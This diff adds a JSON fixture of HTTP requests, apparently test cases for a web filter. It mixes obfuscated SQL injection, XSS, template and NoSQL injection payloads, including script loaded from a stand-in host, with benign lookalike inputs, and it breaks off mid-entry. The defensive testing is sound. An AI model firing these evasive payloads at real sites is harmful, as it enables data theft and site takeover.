@@ -1,0 +1,9788 @@
+[
+  {
+    "name": "injection variant 1 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "105"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1&#39; OR &#x27;1&#x27;&#61&#391\"}, \"tags\": [\"a\", \"1&#39; OR &#x27;1&#x27;&#61&#391\"]}"
+  },
+  {
+    "name": "injection variant 2 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1e1union select"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 3 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Cbo%5Cu0064y%5Cx20on%5Cu006co%5Cu0061d%3Deva%5Cu006c%28a%5C164%5C157b%28%27YQ%3D%3D%27%29%29%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 4 (path)",
+    "method": "GET",
+    "uri": "/page/1%252527%252520OR%252520%2525271%252527%25253D%2525271",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 5 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "67"
+      ]
+    ],
+    "body": "comment=use%5Cx72%40%5C145%5Cu0078a%5Cu006d%5C160le.co%5Cu006d&ok=1"
+  },
+  {
+    "name": "injection variant 6 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=O\\25 27Brien"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 7 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "118"
+      ]
+    ],
+    "body": "comment=%5C27%20%3Ba%5C4c%20ERt%5C28%20STR%5C49%20NG%5C2e%20FromchARc%5C6f%20De%5C28%20%5C38%208%29%29%2F%5C2f%20&ok=1"
+  },
+  {
+    "name": "injection variant 8 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "77"
+      ]
+    ],
+    "body": "comment=%26%23x3c%3Bsvg%20onload%26%23x3d%3Balert%26%23401%29%26%2362%3B&ok=1"
+  },
+  {
+    "name": "injection variant 9 (query)",
+    "method": "GET",
+    "uri": "/item?id=kitap",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 10 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 11 (query)",
+    "method": "GET",
+    "uri": "/item?id=a%5C144mi%5Cu006e%5Cu0027--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 12 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1' OR '1'='1"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 13 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%2520OR%2520pg_sleep%2526%2523x28%253B5%2529=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 14 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "51"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"kitap\"}, \"tags\": [\"a\", \"kitap\"]}"
+  },
+  {
+    "name": "injection variant 15 (arg name)",
+    "method": "GET",
+    "uri": "/item?It%27s%2F%2Ax%2A%2F5%2F%2Ax%2A%2Fo%27clock=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 16 (query)",
+    "method": "GET",
+    "uri": "/item?id=script%20writing%20course",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 17 (arg name)",
+    "method": "GET",
+    "uri": "/item?%22%3E%3Cscript%3Efetch%28%27%2F%2Fx%27%29%3C%2Fscript%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 18 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1; WAITFOR DELAY '0:0:5'"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 19 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%20UnIon%20ALl%20%5C53%20%5C65%20lE%5C63%20t%20NULl%2Cn%5C75%20Ll%5C2d%20-",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 20 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "80"
+      ]
+    ],
+    "body": "comment=1%3B%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27&ok=1"
+  },
+  {
+    "name": "injection variant 21 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "42"
+      ]
+    ],
+    "body": "comment=1e1uni%5Cu006f%5Cx6e%20select&ok=1"
+  },
+  {
+    "name": "injection variant 22 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "70"
+      ]
+    ],
+    "body": "comment=%22%3E%3CSCRIpt%3EfETcH%28%27%2F%2FX%27%29%3C%2FsCRIpT%3E&ok=1"
+  },
+  {
+    "name": "injection variant 23 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "67"
+      ]
+    ],
+    "body": "comment=drop%26%2338%3B%23x20%26%23x3b%3Bme%20a%26%2332%3Bline&ok=1"
+  },
+  {
+    "name": "injection variant 24 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "78"
+      ]
+    ],
+    "body": "comment=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&ok=1"
+  },
+  {
+    "name": "injection variant 25 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "127"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<script src = //evil.example/x.js></script>\"}, \"tags\": [\"a\", \"<script src = //evil.example/x.js></script>\"]}"
+  },
+  {
+    "name": "injection variant 26 (query)",
+    "method": "GET",
+    "uri": "/item?id=dRoP%20mE%20A%20liNE",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 27 (arg name)",
+    "method": "GET",
+    "uri": "/item?KitAP=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 28 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=' UNION ALL SELECT NULL,NULL--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 29 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "%27%3Balert%28String.fromCharCode%2888%29%29%2F%2F"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 30 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<body onload=eval(atob('YQ=='))>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 31 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cdiv%20style%3D%22width%3Aexpression%28alert%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 32 (query)",
+    "method": "GET",
+    "uri": "/item?id=%5C27%20%3Balert%28S%5C74%20%5C72%20ing%5C2e%20%5C66%20r%5C6f%20%5C6d%20Cha%5C72%20Co%5C64%20e%2888%5C29%20%29%2F%2F",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 33 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1'/*x*/OR/*x*/'1'='1"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 34 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "52"
+      ]
+    ],
+    "body": "comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ok=1"
+  },
+  {
+    "name": "injection variant 35 (path)",
+    "method": "GET",
+    "uri": "/page/1%27%20OR%20%271%27%20%3D%20%271",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 36 (query)",
+    "method": "GET",
+    "uri": "/item?id=It%27s%205%20o%27clock",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 37 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "248"
+      ]
+    ],
+    "body": "comment=%5C7b%20%7Bcons%5C74%20r%5C5c%207%5C35%20%20%5C5c%2063%20%5C74%20%5C6f%20r%5C2e%20const%5C7%5C32%20%5C20%20uct%5C6f%20r%5C5c%20%5C32%208%20%27al%5C65%20r%5C74%20%5C%5C32%208%201%29%27%5C5c%2029%5C20%20%5C%5C32%208%20%29%7D%5C5c%207d%20&ok=1"
+  },
+  {
+    "name": "injection variant 38 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "52"
+      ]
+    ],
+    "body": "comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ok=1"
+  },
+  {
+    "name": "injection variant 39 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "83"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"script writing course\"}, \"tags\": [\"a\", \"script writing course\"]}"
+  },
+  {
+    "name": "injection variant 40 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=2026-10-11"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 41 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "78"
+      ]
+    ],
+    "body": "comment=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&ok=1"
+  },
+  {
+    "name": "injection variant 42 (path)",
+    "method": "GET",
+    "uri": "/page/%26%2360%3Bscript%20src%3D%2F%2Fevil%26%23x2e%3Bexample%2Fx%26%23x2e%3Bjs%3E%26LT%26%2347script%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 43 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cdiv%20style%3D%22width%3Aexpression%28alert%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 44 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Cdiv%20%20style%3D%22width%3Aexpression%28alert%281%29%29%22%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 45 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "59"
+      ]
+    ],
+    "body": "comment=%3CifRAMe%20sRc%3DjAvaSCRIpt%3AaLErt%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 46 (query)",
+    "method": "GET",
+    "uri": "/item?id=drop%20me%20a%20line",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 47 (query)",
+    "method": "GET",
+    "uri": "/item?id=%255Cx64%255C157cu%255Cx6den%255Cu0074.write%2528%255Cu0027%253Cb%255Cx3e%2527%255C51",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 48 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "91"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<script>alert(1)</script>\"}, \"tags\": [\"a\", \"<script>alert(1)</script>\"]}"
+  },
+  {
+    "name": "injection variant 49 (query)",
+    "method": "GET",
+    "uri": "/item?id=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 50 (path)",
+    "method": "GET",
+    "uri": "/page/%5C31%20%27%20%5C4f%20R%20%271%5C27%20%5C3d%20%271",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 51 (query)",
+    "method": "GET",
+    "uri": "/item?id=x%27%20AND%201%3DCONVERT%28int%2C%40%40version%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 52 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "87"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1 AND&#x20;SLEEP&#40;5)\"}, \"tags\": [\"a\", \"1 AND&#x20;SLEEP&#40;5)\"]}"
+  },
+  {
+    "name": "injection variant 53 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "' UNION ALL SELECT NULL,NULL--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 54 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "23"
+      ]
+    ],
+    "body": "comment=2026-10-11&ok=1"
+  },
+  {
+    "name": "injection variant 55 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20AND%20%5C42%20ENCH%5C4d%20ARK%281000000%2C%5C4d%20D5%28%5C31%20%5C29%20%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 56 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 57 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "113"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"x' AND 1 = CONVERT (int,@@version)--\"}, \"tags\": [\"a\", \"x' AND 1 = CONVERT (int,@@version)--\"]}"
+  },
+  {
+    "name": "injection variant 58 (path)",
+    "method": "GET",
+    "uri": "/page/1%27%2F%2A%2A%2FAND%2F%2A%2A%2Fextractvalue%2F%2A%2A%2F%281%2Cconcat%2F%2A%2A%2F%280x7e%2Cversion%2F%2A%2A%2F%28%29%29%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 59 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1 OR pg_sleep(5)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 60 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "51"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"kitap\"}, \"tags\": [\"a\", \"kitap\"]}"
+  },
+  {
+    "name": "injection variant 61 (path)",
+    "method": "GET",
+    "uri": "/page/1%20Or%20pg_SlEep%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 62 (arg name)",
+    "method": "GET",
+    "uri": "/item?It%27s%205%20o%27clock=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 63 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "2026-10-11"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 64 (path)",
+    "method": "GET",
+    "uri": "/page/select%20a%20colour",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 65 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%09AND%09SLEEP%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 66 (query)",
+    "method": "GET",
+    "uri": "/item?id=IT%27S%205%26%23X20%3BO%26%2339CLoCk",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 67 (path)",
+    "method": "GET",
+    "uri": "/page/O%2527Brien",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 68 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "117"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"document.write('&#x3c;b&#62;&#39&#x29;\"}, \"tags\": [\"a\", \"document.write('&#x3c;b&#62;&#39&#x29;\"]}"
+  },
+  {
+    "name": "injection variant 69 (query)",
+    "method": "GET",
+    "uri": "/item?id=%7B%22%24ne%22%3A%20null%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 70 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e%26%23x5c%3B31%20%5C75%20nion%5C20%26%2332%5C73%26%2332ele%26%23x5c%3B63%20%5C74%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 71 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "select a colour"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 72 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "select/**/a/**/colour"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 73 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ciframe%20src%20%3D%20javascript%3Aalert%20%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 74 (arg name)",
+    "method": "GET",
+    "uri": "/item?O%27Brien=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 75 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "42"
+      ]
+    ],
+    "body": "comment=drop%20%20me%20%20a%20%20line&ok=1"
+  },
+  {
+    "name": "injection variant 76 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 77 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%27%20AND%20extractvalue%20%281%2Cconcat%20%280x7e%2Cversion%20%28%29%29%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 78 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
